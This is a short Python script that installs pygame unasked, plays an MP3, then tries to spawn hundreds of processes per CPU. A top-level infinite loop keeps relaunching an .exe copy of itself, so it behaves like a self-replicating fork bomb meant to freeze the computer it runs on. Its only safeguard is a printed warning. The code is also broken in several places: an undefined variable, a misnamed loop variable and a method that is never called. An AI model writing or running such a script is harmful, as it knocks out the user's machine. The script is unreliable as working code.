import subprocess
import sys
import os
from multiprocessing import Process, cpu_count
import time


# Function to instcall pygame if it's not installed
def install_pygame():
    try:
        import pygame
    except ImportError:
        print("Pygame not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"])
        import pygame  # Retry the import after installation
        print("Pygame installed successfully!")

mp3_file = "Ramiel.mp3" 
def play_mp3(file):
    install_pygame()
    import pygame
    
    pygame.mixer.init()

    # Load the MP3 file
    pygame.mixer.music.load(file)

    # Play the MP3 file
    pygame.mixer.music.play()

    while pygame.mixer.music.get_busy():
        pygame.time.Clock().tick(10)


def counter(number):
    while number > 0:
        number -=1
        time.sleep(0.1)

def spawn_processes(num_process):
    processes = [Process(target=counter, args=(1000,))for _ in range(num_process)]
    for process in process:
        process.start
        print(f"Started Process{process.pid}.")
    for process in processes:
        process.join()
        print(f"Process {process.pid}has finished.")


def main():
    mp3_file = "Ramiel.mp3" 
    play_mp3(mp3_file)
    num_processors = cpu_count()
    num_processes=num_processes*200
    print(f"Number of logical processors: {num_processors}")
    print(f"Creating {num_processes} processes.")
    print("Warning: This will consume a lot of system resources, and potentially freeze your PC, make sure to adjust the number of processes and sleep seconds as needed.")
    spawn_processes(num_processes)
    
while True:
    os.startfile(__file__[:-2]+"exe")
    main()

